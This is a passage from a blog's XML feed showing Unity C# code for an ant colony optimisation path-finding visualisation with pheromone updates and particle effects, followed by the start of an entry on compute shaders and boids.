class="number">1</span>; i &gt; <span class="number">0</span>; i --) result += i;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// passing the index of two point</span></span><br><span class="line">    <span class="comment">// return the index of the path connecting them</span></span><br><span class="line">    <span class="function"><span class="built_in">int</span> <span class="title">GetPathIndex</span>(<span class="params"><span class="built_in">int</span> cur1, <span class="built_in">int</span> cur2</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">if</span> (cur1 &gt; cur2)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">int</span> tmp = cur1;</span><br><span class="line">            cur1 = cur2;</span><br><span class="line">            cur2 = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">int</span> index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">1</span>; i &lt;= cur1; i++) index += numPoint - i;</span><br><span class="line">        index += cur2 - cur1 - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> index;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Awake</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        nowPath = FindObjectOfType&lt;NowPath&gt;();</span><br><span class="line">        crossPath = FindObjectOfType&lt;CrossPath&gt;();</span><br><span class="line">        <span class="comment">//numPath = (int)C(numPoint, 2);</span></span><br><span class="line">        numPath = C2(numPoint);</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPath &amp;&amp; bParticle; i ++)</span><br><span class="line">            Instantiate(particalPrefab);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        turnCnt = <span class="number">0</span>;</span><br><span class="line">        preTimeLeft = <span class="number">0</span>;</span><br><span class="line">        bAuto = <span class="literal">false</span>;</span><br><span class="line">        bFirstRound = <span class="literal">true</span>;</span><br><span class="line">        pPos = <span class="keyword">new</span> Vector2[numPoint];</span><br><span class="line">        minPath = <span class="keyword">new</span> <span class="built_in">int</span>[numPoint];</span><br><span class="line">        <span class="built_in">float</span> sqrMinDis = minDis * minDis;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// gen random points</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            minPath[i] = i;</span><br><span class="line"></span><br><span class="line">            Vector2 pos = <span class="keyword">new</span> Vector2(Random.Range(-xRange, xRange), Random.Range(-yRange, yRange));</span><br><span class="line">            <span class="built_in">bool</span> tooClose = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; i; j++)</span><br><span class="line">                <span class="keyword">if</span> ((pos - pPos[j]).sqrMagnitude &lt; sqrMinDis)</span><br><span class="line">                &#123;</span><br><span class="line">                    i--;</span><br><span class="line">                    tooClose = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">if</span> (tooClose) <span class="keyword">continue</span>;</span><br><span class="line">            GameObject point = Instantiate(pointPrefab);</span><br><span class="line">            point.transform.position = pos;</span><br><span class="line">            point.name = i.ToString();</span><br><span class="line">            pPos[i] = pos;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// calculate pheromone parameters</span></span><br><span class="line">        pheMax = deltaPhe * pheMaxTimes * numInGroup;</span><br><span class="line">        pheInit = pheMax / <span class="number">5</span>;</span><br><span class="line">        pheMin = pheInit * Mathf.Pow(pheDrop, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// initialization of arrays</span></span><br><span class="line">        pheromone = <span class="keyword">new</span> <span class="built_in">float</span>[numPath];</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPath; i++)</span><br><span class="line">            pheromone[i] = pheInit;</span><br><span class="line">        dis = <span class="keyword">new</span> <span class="built_in">float</span>[numPath];</span><br><span class="line">        particles = FindObjectsOfType&lt;Particle&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// calculate distance</span></span><br><span class="line">        <span class="comment">// set rotation and length of particles</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint - <span class="number">1</span>; i++)</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> j = i + <span class="number">1</span>; j &lt; numPoint; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">int</span> nowIndex = GetPathIndex(i, j);</span><br><span class="line">                dis[nowIndex] = (pPos[j] - pPos[i]).magnitude;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(bParticle)</span><br><span class="line">                &#123;</span><br><span class="line">                    particles[nowIndex].transform.position = pPos[i];</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">float</span> angle = Vector2.Angle(Vector2.up, pPos[j] - pPos[i]);</span><br><span class="line">                    <span class="keyword">if</span> (Vector3.Cross(Vector2.up, pPos[j] - pPos[i]).z &gt; <span class="number">0</span>) angle = -angle;</span><br><span class="line">                    particles[nowIndex].SetParticleRot(angle);</span><br><span class="line"></span><br><span class="line">                    particles[nowIndex].SetParticleDis(dis[nowIndex]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// initialize line renderer</span></span><br><span class="line">        lineRenderer = GetComponent&lt;LineRenderer&gt;();</span><br><span class="line">        lineRenderer.positionCount = numPoint + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Update</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        bSpace = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (Input.GetKeyDown(KeyCode.W))</span><br><span class="line">        &#123;</span><br><span class="line">            preTimeLeft = preTimes;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (preTimeLeft &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            preTimeLeft--;</span><br><span class="line">            Opt();</span><br><span class="line">            <span class="keyword">if</span> (preTimeLeft == <span class="number">0</span>) print(<span class="string">&quot;preTimeFinished&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (Input.GetKeyDown(KeyCode.Space))</span><br><span class="line">        &#123;</span><br><span class="line">            bSpace = <span class="literal">true</span>;</span><br><span class="line">            Opt();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (Input.GetKeyDown(KeyCode.S))</span><br><span class="line">        &#123;</span><br><span class="line">            GameObject[] points = GameObject.FindGameObjectsWithTag(<span class="string">&quot;Point&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                Destroy(points[i]);</span><br><span class="line">                nowPath.ClearPath();</span><br><span class="line">            &#125;</span><br><span class="line">            Start();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (Input.GetKeyDown(KeyCode.A))</span><br><span class="line">        &#123;</span><br><span class="line">            print(<span class="string">&quot;AUTO&quot;</span>);</span><br><span class="line">            bAuto = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (Input.GetKeyDown(KeyCode.D))</span><br><span class="line">        &#123;</span><br><span class="line">            print(<span class="string">&quot;MANUAL&quot;</span>);</span><br><span class="line">            bAuto = <span class="literal">false</span>;</span><br><span class="line">            print(turnCnt);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (bAuto) Opt();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Opt</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        turnCnt++;</span><br><span class="line">        <span class="built_in">int</span>[] path = <span class="keyword">new</span> <span class="built_in">int</span>[numPoint * numInGroup];</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> antCnt = <span class="number">0</span>; antCnt &lt; numInGroup; antCnt++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// offset of starting point index</span></span><br><span class="line">            <span class="built_in">int</span> offset = Random.Range(<span class="number">0</span>, numPoint);</span><br><span class="line">            <span class="built_in">int</span> nowP = offset;</span><br><span class="line">            <span class="built_in">int</span> numVisited = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">bool</span>[] visited = <span class="keyword">new</span> <span class="built_in">bool</span>[numPoint];</span><br><span class="line">            visited[offset] = <span class="literal">true</span>;</span><br><span class="line">            path[numPoint * antCnt] = offset;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> turn = <span class="number">0</span>; turn &lt; numPoint - <span class="number">1</span>; turn++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">float</span>[] tempDis = <span class="keyword">new</span> <span class="built_in">float</span>[numPoint];</span><br><span class="line">                <span class="built_in">float</span>[] tempPhe = <span class="keyword">new</span> <span class="built_in">float</span>[numPoint];</span><br><span class="line">                <span class="built_in">float</span>[] weight = <span class="keyword">new</span> <span class="built_in">float</span>[numPoint];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint; i++)</span><br><span class="line">                    <span class="keyword">if</span> (!visited[i])</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="built_in">int</span> nowIndex = GetPathIndex(nowP, i);</span><br><span class="line">                        <span class="built_in">float</span> nowDis = Mathf.Pow(<span class="number">1f</span> / dis[nowIndex], disPow);</span><br><span class="line">                        <span class="comment">// weight will be diveded by total then</span></span><br><span class="line">                        tempPhe[i] = pheromone[nowIndex];</span><br><span class="line">                        tempDis[i] = nowDis;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// calculate weight</span></span><br><span class="line">                <span class="built_in">float</span> totalWeight = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint; i++)</span><br><span class="line">                    <span class="keyword">if</span> (!visited[i])</span><br><span class="line">                    &#123;</span><br><span class="line">                        weight[i] = Mathf.Pow(tempDis[i] * tempPhe[i], weightPow);</span><br><span class="line">                        <span class="comment">// reduce chance of getting cross</span></span><br><span class="line">                        <span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; numVisited - <span class="number">1</span>; j ++)</span><br><span class="line">                            <span class="keyword">if</span>(DetectCross(pPos[i], pPos[nowP], pPos[path[j + numPoint * antCnt]], pPos[path[j + <span class="number">1</span> + numPoint * antCnt]]))</span><br><span class="line">                                weight[i] /= crossDiv;</span><br><span class="line"></span><br><span class="line">                        totalWeight += weight[i];</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint; i++)</span><br><span class="line">                    <span class="keyword">if</span> (!visited[i])</span><br><span class="line">                        weight[i] /= totalWeight;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Random.value returns in range [0,1]</span></span><br><span class="line">                <span class="built_in">float</span> choice = Random.<span class="keyword">value</span>;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">int</span> decideIndex = offset;</span><br><span class="line">                <span class="built_in">int</span> maxCnt = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span> (maxCnt &lt; <span class="number">2</span> * numPoint)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">int</span> judgingIndex = decideIndex % numPoint;</span><br><span class="line">                    choice -= weight[judgingIndex];</span><br><span class="line">                    <span class="keyword">if</span> (choice &lt;= <span class="number">0</span> &amp;&amp; !visited[judgingIndex])</span><br><span class="line">                    &#123;</span><br><span class="line">                        numVisited++;</span><br><span class="line">                        path[numVisited + numPoint * antCnt] = judgingIndex;</span><br><span class="line">                        nowP = judgingIndex;</span><br><span class="line">                        visited[judgingIndex] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    decideIndex++;</span><br><span class="line">                    maxCnt++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// update when a turn is ending</span></span><br><span class="line">            <span class="keyword">if</span> (antCnt == numInGroup - <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">float</span> localMinPathDis = <span class="built_in">float</span>.MaxValue;</span><br><span class="line">                <span class="built_in">float</span>[] disGroup = <span class="keyword">new</span> <span class="built_in">float</span>[numInGroup];</span><br><span class="line">                <span class="built_in">int</span> localMinIndex = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// get localMinPathDis and its index</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">int</span> antIndex = <span class="number">0</span>; antIndex &lt; numInGroup; antIndex++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint; i++)</span><br><span class="line">                        disGroup[antIndex] += dis[GetPathIndex(path[i + numPoint * antIndex],</span><br><span class="line">                            (i + <span class="number">1</span>) % numPoint == <span class="number">0</span> ? path[numPoint * antIndex] : path[i + <span class="number">1</span> + numPoint * antIndex])];</span><br><span class="line">                    <span class="keyword">if</span> (disGroup[antIndex] &lt; localMinPathDis)</span><br><span class="line">                    &#123;</span><br><span class="line">                        localMinPathDis = disGroup[antIndex];</span><br><span class="line">                        localMinIndex = antIndex;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">                <span class="built_in">int</span>[] localMinPath = <span class="keyword">new</span> <span class="built_in">int</span>[numPoint];</span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint; i++)</span><br><span class="line">                    localMinPath[i] = path[i + localMinIndex * numPoint];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(bFirstRound)</span><br><span class="line">                &#123;</span><br><span class="line">                    minPathDis = localMinPathDis;</span><br><span class="line">                    minCrossCnt = CountCross(localMinPath);</span><br><span class="line">                    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint; i++)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span>(bDrawLine) lineRenderer.SetPosition(i, pPos[localMinPath[i]]);</span><br><span class="line">                        minPath[i] = localMinPath[i];</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(bDrawLine) lineRenderer.SetPosition(numPoint, pPos[localMinPath[<span class="number">0</span>]]);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// pheromone drop</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPath; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    pheromone[i] *= pheDrop;</span><br><span class="line">                    <span class="keyword">if</span> (pheromone[i] &lt; pheMin) pheromone[i] = pheMin;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// add pheromone of the turn</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">int</span> antIndex = <span class="number">0</span>; antIndex &lt; numInGroup; antIndex++)</span><br><span class="line">                    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint; i++)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="built_in">int</span> nowIndex = GetPathIndex(path[i + numPoint * antIndex], (i + <span class="number">1</span>) % numPoint == <span class="number">0</span></span><br><span class="line">                            ? path[numPoint * antIndex] : path[i + <span class="number">1</span> + numPoint * antIndex]);</span><br><span class="line">                        <span class="comment">// shorter path impacts pheromone more</span></span><br><span class="line">                        pheromone[nowIndex] += deltaPhe * Mathf.Pow(localMinPathDis / disGroup[antIndex], dropPow);</span><br><span class="line">                        <span class="keyword">if</span> (pheromone[nowIndex] &gt; pheMax) pheromone[nowIndex] = pheMax;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// emphasize best solution but avoid its crossing parts and small angle</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">int</span> cur1 = minPath[i];</span><br><span class="line">                    <span class="built_in">int</span> cur2 = (i + <span class="number">1</span>) % numPoint == <span class="number">0</span> ? minPath[<span class="number">0</span>] : minPath[i + <span class="number">1</span>];</span><br><span class="line">                    <span class="built_in">int</span> nowIndex = GetPathIndex(cur1, cur2);</span><br><span class="line">                    pheromone[nowIndex] += deltaPhe * emphasizeBest;</span><br><span class="line">                    <span class="keyword">if</span> (pheromone[nowIndex] &gt; pheMax) pheromone[nowIndex] = pheMax;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// avoid crossing</span></span><br><span class="line">                    <span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; i - <span class="number">1</span>; j++)</span><br><span class="line">                        <span class="keyword">if</span> (DetectCross(pPos[cur1], pPos[cur2], pPos[minPath[j]], pPos[minPath[j + <span class="number">1</span>]]))</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="built_in">int</span> anoIndex = GetPathIndex(minPath[j], minPath[j + <span class="number">1</span>]);</span><br><span class="line">                            pheromone[nowIndex] = pheMin;</span><br><span class="line">                            pheromone[anoIndex] = pheMin;</span><br><span class="line"></span><br><span class="line">                            pheromone[GetPathIndex(cur1, minPath[j])] += deltaPhe * crossTweakForce;</span><br><span class="line">                            <span class="keyword">if</span> (pheromone[GetPathIndex(cur1, minPath[j])] &gt; pheMax) pheromone[nowIndex] = pheMax;</span><br><span class="line">                            pheromone[GetPathIndex(cur2, minPath[j + <span class="number">1</span>])] += deltaPhe * crossTweakForce;</span><br><span class="line">                            <span class="keyword">if</span> (pheromone[GetPathIndex(cur2, minPath[j + <span class="number">1</span>])] &gt; pheMax) pheromone[nowIndex] = pheMax;</span><br><span class="line">                        &#125;</span><br><span class="line">                    <span class="comment">// avoid small angle</span></span><br><span class="line">                    <span class="keyword">if</span> (i != <span class="number">0</span> &amp;&amp; DetectSmallAngle(pPos[cur1] - pPos[cur2], pPos[cur1] - pPos[minPath[i - <span class="number">1</span>]], angleOffset))</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="built_in">int</span> anoIndex = GetPathIndex(minPath[i - <span class="number">1</span>], cur1);</span><br><span class="line"></span><br><span class="line">                        pheromone[nowIndex] -= deltaPhe * emphasizeBest;</span><br><span class="line">                        pheromone[anoIndex] -= deltaPhe * emphasizeBest;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// set particle size based on pheromone</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint &amp;&amp; bParticle; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">int</span> mostPheIndex = i + <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="built_in">int</span> j = i + <span class="number">1</span>; j &lt; numPoint; j++)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="built_in">int</span> nowIndex = GetPathIndex(i, j);</span><br><span class="line">                        <span class="built_in">float</span> sizeRatio = (pheromone[nowIndex] - pheMin) / (pheMax - pheMin);</span><br><span class="line">                        particles[nowIndex].SetParticleSize(sizeRatio);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                    </span><br><span class="line">                <span class="comment">// update minPathDis and display</span></span><br><span class="line">                <span class="keyword">if</span> (localMinPathDis &lt; minPathDis)</span><br><span class="line">                &#123;</span><br><span class="line">                    minCrossCnt = CountCross(localMinPath);</span><br><span class="line">                    minPathDis = localMinPathDis;</span><br><span class="line">                    print(minPathDis);</span><br><span class="line">                    print(minCrossCnt);</span><br><span class="line">                    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint; i++)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span>(bDrawLine) lineRenderer.SetPosition(i, pPos[localMinPath[i]]);</span><br><span class="line">                        minPath[i] = localMinPath[i];</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">if</span>(bDrawLine) lineRenderer.SetPosition(numPoint, pPos[localMinPath[<span class="number">0</span>]]);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// show Recent Path</span></span><br><span class="line">                <span class="keyword">if</span> (bSpace &amp;&amp; !bParticle) nowPath.DrawNowPath(path, pPos, numPoint, localMinIndex);</span><br><span class="line"></span><br><span class="line">                bFirstRound = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="built_in">int</span> <span class="title">CountCross</span>(<span class="params"><span class="built_in">int</span>[] path</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="built_in">int</span> crossCnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">2</span>; i &lt; path.Length; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            Vector3 pA = pPos[path[i]];</span><br><span class="line">            Vector3 pB = pPos[i + <span class="number">1</span> == path.Length ? path[<span class="number">0</span>] : path[i + <span class="number">1</span>]];</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; i - <span class="number">1</span>; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                Vector3 pC = pPos[path[j]];</span><br><span class="line">                Vector3 pD = pPos[path[j + <span class="number">1</span>]];</span><br><span class="line">                <span class="keyword">if</span>(DetectCross(pA, pB, pC, pD)) crossCnt++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> crossCnt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="built_in">bool</span> <span class="title">DetectCross</span>(<span class="params">Vector3 pA, Vector3 pB, Vector3 pC, Vector3 pD</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">if</span> (Vector3.Dot(Vector3.Cross(pA - pD, pC - pD), Vector3.Cross(pB - pD, pC - pD)) &lt; <span class="number">0</span></span><br><span class="line">            &amp;&amp; Vector3.Dot(Vector3.Cross(pC - pB, pA - pB), Vector3.Cross(pD - pB, pA - pB)) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="built_in">bool</span> <span class="title">DetectSmallAngle</span>(<span class="params">Vector2 vec1, Vector2 vec2, <span class="built_in">float</span> angleOffset</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">if</span> (Vector2.Angle(vec1, vec2) &lt; angleOffset)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>    </div></div><div class='spoiler collapsed'>    <div class='spoiler-title'>        Particles    </div>    <div class='spoiler-content'>        <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> UnityEngine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Particle</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> sizePow;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">new</span> ParticleSystem particleSystem;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Awake</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        particleSystem = GetComponent&lt;ParticleSystem&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SetParticleRot</span>(<span class="params"><span class="built_in">float</span> angle</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">var</span> sh = particleSystem.shape;</span><br><span class="line">        sh.enabled = <span class="literal">true</span>;</span><br><span class="line">        sh.shapeType = ParticleSystemShapeType.Rectangle;</span><br><span class="line">        sh.rotation = <span class="keyword">new</span> Vector3(<span class="number">0f</span>, angle, <span class="number">0f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SetParticleDis</span>(<span class="params"><span class="built_in">float</span> dis</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">var</span> main = particleSystem.main;</span><br><span class="line">        <span class="built_in">float</span> speed = main.startSpeed.constant;</span><br><span class="line">        main.startLifetime = dis / speed;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// max Size = 2.5, min Size = 0.5</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SetParticleSize</span>(<span class="params"><span class="built_in">float</span> sizeRatio</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">var</span> main = particleSystem.main;</span><br><span class="line">        sizeRatio = Mathf.Pow(sizeRatio, sizePow);</span><br><span class="line">        <span class="built_in">float</span> size = sizeRatio * <span class="number">2.5f</span>;</span><br><span class="line">        main.startSize = size &gt; <span class="number">0.5f</span>? size : <span class="number">0f</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>    </div></div><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Unity </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Compute Shader and Boid</title>
      <link href="2021/09/23/ComputeShaderAndBoid/"/>
      <url>2021/09/23/ComputeShaderAndBoid/</url>
      
